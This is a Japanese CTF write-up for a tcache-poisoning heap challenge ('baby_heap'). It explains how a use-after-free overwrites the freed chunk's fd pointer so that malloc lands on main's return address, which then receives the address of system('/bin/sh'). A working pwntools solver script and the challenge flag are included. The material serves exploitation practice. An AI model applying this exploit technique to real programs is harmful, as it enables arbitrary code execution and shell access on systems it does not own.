---
title: baby_heap
level: 3
flag: FLAG{This_is_Hint_for_the_diva}
writer: EBeb
badge: true
---

# REAL_BABY_HEAP 

## 問題文
Tcache poisoningを練習するための問題です。
- 自由にmallocとfreeと書き込みができます。
- freeされたchunkにはデータの代わりにfdというアドレスが残ります。
- fd(forward)はLast-In-First-OutのLinked Listで構成されます。
- malloc先はこのfdのアドレスを参照して決められます。
- main_retにmallocしてsystem('/bin/sh')を書いてmain関数を終了しましょう。

`nc babyheap.pwn.wanictf.org 9006`


## 解法

### Step 1. main retにMallocする。


freeされたChunkにも書き込みができるUse After Freeがある。　これでfdを書き換えることでmallocされるアドレスを変更できる。

ここにmain関数のretアドレスをいれると、上のfdの情報からいつそこにmallocされるか見ることができる。

適当なChunkをFreeして、freeされたchunkにmain retを書くことでmain_retの値を書き換えることができる。

### Step 2. main retアドレスにあるChunkにsystem('/bin/sh')命令のアドレスを書き込む


これでMain関数が終了されたらsystem('/bin/sh')が実行される。

この事実でmain関数のretが書き換えられたことが確認できる。

 

### Solverのコードと結果

```
from pwn import *

pc = process("./chall")
print(pc.recvuntil(b"at >"))
binsh = int(pc.recvuntil(b"\n")[:-1], 16)
print(pc.recvuntil(b"Return address of main at >"))
main_ret = int(pc.recvuntil(b"\n")[:-1], 16)
print(hex(binsh))
print(hex(main_ret))
# malloc
pc.sendline("1")
pc.sendline("0")
# malloc
pc.sendline("1")
pc.sendline("1")
# free
pc.sendline("2")
pc.sendline("0")
# free
pc.sendline("2")
pc.sendline("1")
# overwrite fd
pc.sendline("3")
pc.sendline("1")
pc.sendline(hex(main_ret))
# malloc
pc.sendline("1")
pc.sendline("2")
# malloc at main_ret
pc.sendline("1")
pc.sendline("3")
# write at main_ret
pc.sendline("3")
pc.sendline("3")
pc.sendline(hex(binsh))
# end main
pc.sendline("4")
# shell
pc.interactive()
```
